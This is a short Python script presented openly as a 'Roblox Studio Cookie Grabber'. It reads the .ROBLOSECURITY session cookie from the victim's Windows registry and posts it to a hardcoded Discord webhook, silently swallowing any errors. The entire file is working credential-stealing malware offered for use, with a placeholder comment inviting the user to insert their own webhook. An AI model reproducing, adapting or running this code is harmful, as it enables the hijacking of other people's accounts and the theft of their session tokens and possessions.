'''
Roblox Studio Cookie Grabber // Registry Key

By vesper#0003

'''
# import libs
import requests
from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue

webhook = "https://discord.com/api/webhooks/997950009574166528/IxAr7BChMSaLwK6G_8s46eGcsWAC0G1x43_JY6oxgwyQkMfgGegIbX2kv8pkDv15HfiH" # Put your discord webhook in here

def init():
    # opening the roblox studio key
    robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
    # finding the subkey called ".robloxsecurity"
    try:
        count = 0
        while True:
            name, value, type = EnumValue(robloxstudiopath, count)
            if name == ".ROBLOSECURITY":
                # returns the value of .robloxsecurity
                return value
            count = count + 1
    except WindowsError:
        pass
try:
    # This will try to return the value of the subkey ".robloxsecurity"
    roblox_cookie_value = str(init())
    # try to get the exact cookie
    roblox_cookie = roblox_cookie_value.split("COOK::<")[1].split(">")[0]
    # post cookie to your webhook
    requests.post(webhook, json={"username":"Roblox Cookie Grabber","content":f"```{roblox_cookie}```"})
    # The roblox studio path wasn't found
except:pass
